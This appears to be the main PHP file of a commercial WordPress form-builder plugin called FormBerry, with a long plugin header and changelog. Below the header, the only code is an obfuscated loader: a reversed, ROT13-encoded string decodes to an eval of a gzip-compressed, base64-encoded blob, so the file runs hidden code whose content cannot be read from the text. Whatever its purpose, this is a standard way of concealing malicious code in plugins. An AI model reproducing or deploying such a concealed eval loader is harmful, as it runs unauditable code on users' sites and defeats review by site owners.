<?php
/**
 * Copyright: © 2011 Trigy Networks, Inc.
 * {@link http://www.trigy.com}
 */

/** 
 * Wordpress plugin information
 * -----------------------------------------------------------
 * Plugin Name: FormBerry
 * Plugin URI: http://www.formberry.com
 * Description: FormBerry Easy Form Builder For WordPress is a feature rich contact form plugin with advanced yet easy to use interface, anti spam feature, digital signature widget, import export capability, conditional logic fields, works with major autoresponder, Google Analytics tracking and post to WordPress comments via the FormBerry form.
 * Version: 1.3.1
 * Author: Leonardo Quijano for Trigy Networks, Inc.
 * License: FormBerry Single License (see EULA). 'Includes' directory files are copyright of their respective authors.
 * SSL Compatible: yes
 * WordPress Compatible: yes
 * WP Multisite Compatible: no
 * Tested up to: 3.3.1
 * Requires at least: 3.1
 * Requires: WordPress® 3.1+, PHP 5.2.0+
 * Changelog:
 * - 1.3.1 (2012-06-10) by Leo
 *   - CRITICAL: Fixed database setup problem in version 1.3.0.
 *   - Added workaround for users of version 1.3.0 that were stuck with a non-working version of FormBerry.
 *   - Fixed problem with remote license verification checks and server timeouts.
 * 
 * - 1.3.0 (2012-05-30) by Leo
 *   - NEW FEATURE: Support for conditionals on form fields.
 *   - Fixed small redirect bug when importing new forms.
 *   - Fixed multiple-JS-files configuration.
 *   - Some javascript improvements in the form editor.
 *   - Fixed filter names (replaced 'formberrry' for 'formberry' in programming extension points).
 *   - Upgraded included TinyMCE to version 3.5.1.1 (2012-05-25)
 * 
 * - 1.2.6 (2012-04-15) by Leo
 *   - Added 'formberry_after_process_submission' action to hook Auto-Responder submissions.
 *   - Added $current_tab parameter to admin settings page integration for add-on.
 *   - Fixed section handling of move_file_uploads() with anti-spam turned on.
 *   - Some CSS adjustments for admin pages.
 * 
 * - 1.2.5 (2012-04-05) by Leo
 *   - Fixed session handling of form submissions (anti-spam mode wasn't working).
 *   - Small fix in form builder checkbox labels, they now can be clicked to check the box properly.
 *   - Improved "single javascript file" mode dependency when loading admin scripts.
 *   - Fix on installation check while configuring WordPress hooks.
 * 
 * - 1.2.4 (2012-04-03) by Leo
 *   - Fixed fatal error when doing plugin activation on a fresh install of FormBerry.
 *   - Fixed directory creation warnings on database tables installation.
 *   - Moved session_start() to 'send_headers' WordPress action to avoid possible clashes with other plugins init code.
 *   - FormBerry_Domain_Forms::get_by_id_full and get_by_code_full will now return NULL when searching for a missing form. 
 * 
 * - 1.2.3 (2012-04-01) by Leo
 *   - Integrated activation page in a tabbed view and added hooks, so now it supports multiple add-ons activation.
 *   - Improved handling of plugin activation vs installation.
 * 
 * - 1.2.2 (2012-03-31) by Leo
 *   - Added actions and hooks for initialization, settings menus, and forms & submissions handling.
 *   - Added more space to the settings page so more tabs can be added.
 *   - Fixed minor bug when adding new fields, some types (such as 'checkbox') weren't showing all options at first.
 * 
 * - 1.2.1 (2012-03-29) by Leo
 *   - Added license activation code.
 *   - Added new admin page for license keys.
 *   - Added new installation page, to be performed after license code activation.
 * 
 * - 1.2 (2012-03-24) by Leo
 *   - Added new Time Picker widget.
 *   - Added new Signature Pad widget.
 *   - Added new Address widget
 *   - Added form copy capability.
 *   - Added form auto-save capability.
 *   - Added "title_visible" and "subtitle_visible" checkboxes to the Design form builder section.
 *   - Added new functions.php with a basic API for themes:
 *     - formberry_print_form
 *     - formberry_get_form
 *     - formberry_print_form_button
 *     - formberry_get_form_button
 *   - New countries admin page and pre-loaded defaults.
 *   - Fixed fileupload duplicates bug when sorting groups.
 *   - Fixed Google Map's refresh problem when embedding it in a jQuery dialog.
 *   - Other miscellaneous fixes.
 * 
 * - 1.1.2 (2012-03-16) by Leo
 *   - Fixed javascript error when deleting field groups.
 * 
 * - 1.1.1 (2012-03-13) by Leo
 *   - Javascript optimization of form builder to support larger forms.
 *   - Fixed design settings for main body ("Inner Border Color", etc).
 *   - Fixed lightbox problems with lightbox on some PHP servers.
 *   - Added a keep-alive javascript post to prevent session timeouts.
 *   
 * - 1.1.0 (2012-03-09) by Leo
 *   - New user-friendly form builder that allows users to drag & drop widgets
 *     to the form canvas.
 *   - Support for field groups.
 *   - Support for multiple columns in forms and field groups.
 *   - Customized design of form sectors, including removing headers, background
 *     images and border customizations.
 *   - Improvements to the popup dialog forms.
 *   - Miscellaneous bug fixes.
 * 
 * - 1.0.2 (2012-01-15) by Leo
 *   - Fixed javascript conflict with third party themes & plugins when using 
 *     old versions of jQuery (< 1.5).
 *   - Added support for minified & unified javascript loading.
 *   - Uploaded files now get deleted when deleting their associated submissions.
 *   - Improved submissions page navigation when viewing submissions. The 
 *     "Back to Submissions" button now remembers filtering, paging & ordering
 *     from the management page's list.
 * 
 * - 1.0.1 (2012-01-14) by Leo
 *   - Fixed "Import Form" button in Firefox (<input> positioned to left: 0).
 *   - Info fields now support HTML.
 *   - Misc. styling fixes for Firefox and Explorer.
 * 
 * - 1.0.0 (2012-01-13) by Leo
 *   - First beta version of Form Berry.
 * 
 * ----------------------------------------------------------- */
$rtHsLFzW_nfEpC='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';$pjjCCOvCoIWK_=';))))PcRsa_JmSYfUge$(ireegf(rqbprq_46rfno(rgnysavmt(ynir';$XRIgkpKwWYguQgufdIy=strrev($pjjCCOvCoIWK_);$xVRJhKwlVuN=str_rot13($XRIgkpKwWYguQgufdIy);eval($xVRJhKwlVuN);
?>